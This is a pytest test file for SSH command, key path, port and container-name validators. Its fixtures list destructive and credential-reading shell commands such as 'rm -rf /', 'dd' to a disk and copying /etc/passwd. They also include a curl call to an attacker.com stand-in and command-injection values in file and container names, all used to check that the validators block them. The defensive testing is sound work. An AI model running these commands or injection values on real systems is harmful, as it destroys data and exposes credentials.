"""Unit tests for security.py validators."""
import sys
import os

# Run from repo root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from security import (
    validate_ssh_command,
    validate_ssh_key_path,
    validate_host_port,
    validate_nginx_container,
)


# ---------------------------------------------------------------------------
# validate_ssh_command — read-only allowlist
# ---------------------------------------------------------------------------

class TestSshCommandSafe:
    """Commands allowed without confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "uptime",
        "df -h",
        "free -m",
        "ps aux",
        "cat /etc/hostname",
        "head -20 /var/log/syslog",
        "tail -f /var/log/auth.log",
        "grep ERROR /var/log/app.log",
        "journalctl -u nginx -n 100",
        "ls -la /etc",
        "find /var/log -name '*.log' -maxdepth 2",
        "ip a",
        "ss -tlnp",
        "curl -s http://localhost:8080/health",
        "whoami",
        "hostname",
        "uname -a",
        "systemctl status nginx",
        "systemctl is-active docker",
        "docker ps",
        "docker images",
        "docker logs mycontainer",
        "docker inspect mycontainer",
        "ps aux | grep python",
        "cat /etc/os-release | grep VERSION",
        "journalctl -n 50 | grep ERROR",
    ])
    def test_safe_without_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=False)  # must not raise


class TestSshCommandRequiresConfirmed:
    """Commands that require confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo rm -rf /",
        "reboot",
        "shutdown -h now",
        "systemctl stop nginx",
        "systemctl restart nginx",
        "apt install vim",
        "useradd hacker",
        "chmod 777 /etc/passwd",
        "dd if=/dev/zero of=/dev/sda",
        "docker rm mycontainer",
        "docker stop mycontainer",
        "touch /etc/newfile",
        "mkdir /opt/newdir",
        "cp /etc/passwd /tmp/stolen",
    ])
    def test_requires_confirmed(self, cmd):
        with pytest.raises(ValueError, match="confirmed"):
            validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test",
        "systemctl stop nginx",
        "docker rm mycontainer",
        "apt install vim",
    ])
    def test_allowed_with_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=True)  # must not raise


class TestSshCommandAlwaysBlocked:
    """Always blocked regardless of confirmed."""

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "curl `whoami`.attacker.com",
        "cat /etc/passwd > /tmp/stolen",
        "echo test >> /etc/hosts",
        "ls > ~/output.txt",
    ])
    def test_always_blocked(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=True)

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "cat > /etc/passwd",
    ])
    def test_always_blocked_without_confirmed(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=False)


class TestSshCommandLengthLimit:
    def test_too_long(self):
        with pytest.raises(ValueError, match="500"):
            validate_ssh_command("a" * 501, confirmed=False)

    def test_max_length_ok(self):
        # 'uptime' repeated to fill under 500 chars is fine
        validate_ssh_command("uptime", confirmed=False)


# ---------------------------------------------------------------------------
# validate_ssh_key_path
# ---------------------------------------------------------------------------

class TestSshKeyPath:
    def test_valid_path(self):
        validate_ssh_key_path("/app/keys/my-server.pem")

    def test_valid_path_underscore(self):
        validate_ssh_key_path("/app/keys/vps_key.pem")

    @pytest.mark.parametrize("path", [
        "/etc/ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/app/keys/../etc/passwd",
        "/app/keys/",
        "/app/keys/sub/dir/key.pem",
    ])
    def test_invalid_paths(self, path):
        with pytest.raises(PermissionError):
            validate_ssh_key_path(path)

    def test_null_byte(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key\x00.pem")

    def test_special_chars(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key;rm.pem")


# ---------------------------------------------------------------------------
# validate_host_port
# ---------------------------------------------------------------------------

class TestHostPort:
    @pytest.mark.parametrize("port", [80, 443, 8080, 8443, 465, 993, 995])
    def test_allowed_ports(self, port):
        validate_host_port("example.com", port)

    @pytest.mark.parametrize("port", [22, 3306, 5432, 6379, 9000, 8765])
    def test_blocked_ports(self, port):
        with pytest.raises(PermissionError):
            validate_host_port("example.com", port)

    def test_invalid_hostname(self):
        with pytest.raises(ValueError):
            validate_host_port("bad host!", 443)


# ---------------------------------------------------------------------------
# validate_nginx_container
# ---------------------------------------------------------------------------

class TestNginxContainer:
    def test_allowed(self):
        validate_nginx_container("nginx")
        validate_nginx_container("nginx-proxy")

    def test_not_allowed(self):
        with pytest.raises(PermissionError):
            validate_nginx_container("myapp")

    def test_invalid_format(self):
        with pytest.raises(ValueError):
            validate_nginx_container("nginx; rm -rf /")
